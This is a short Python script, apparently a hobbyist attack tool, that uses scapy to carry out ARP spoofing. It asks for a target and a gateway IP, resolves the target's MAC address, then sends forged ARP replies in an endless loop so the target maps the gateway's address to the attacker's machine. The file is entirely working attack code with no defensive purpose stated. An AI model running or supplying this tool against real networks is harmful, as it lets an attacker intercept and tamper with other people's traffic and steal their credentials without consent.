import scapy.all as scapy
import ipaddress
from colorama import Fore, Back, Style

def valid_ip_address(ip_address):
    try:
        ip = ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        return False

def get_MAC(target_ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=target_ip)
    reply, _ = scapy.srp(arp_request,timeout=3,verbose=0)
    if reply:
        return reply[0][1].src
    return None

def spoof(target_ip,target_mac,spoof_ip):
    spoofed_arp_packet = scapy.ARP(pdst=target_ip,hwdst=target_mac,psrc=spoof_ip, op="is-at")
    scapy.send(spoofed_arp_packet, verbose=0)


def main():
    target_ip = input("Enter target-ip: ")
    valid_ip_target = valid_ip_address(target_ip)
    getway_ip = input("Enter getway-ip: ")
    valid_ip_getway = valid_ip_address(getway_ip)

    if valid_ip_target is False or valid_ip_getway is False:
        print(Fore.RED+"IP validation test failed")
        return None
    
    target_mac = None
    print(Fore.YELLOW+"Searching for the MAC address...")
    while not target_mac:
        target_mac = get_MAC(target_ip)

    print(Fore.GREEN+"MAC address was found!")
    print(Fore.YELLOW+"The MAC adress is:{}".format(target_mac))
    print(Fore.BLUE+"spoofer is active!")
    Fore.RESET

    while True:
        spoof(target_ip,target_mac,getway_ip)

if __name__=="__main__":
    main()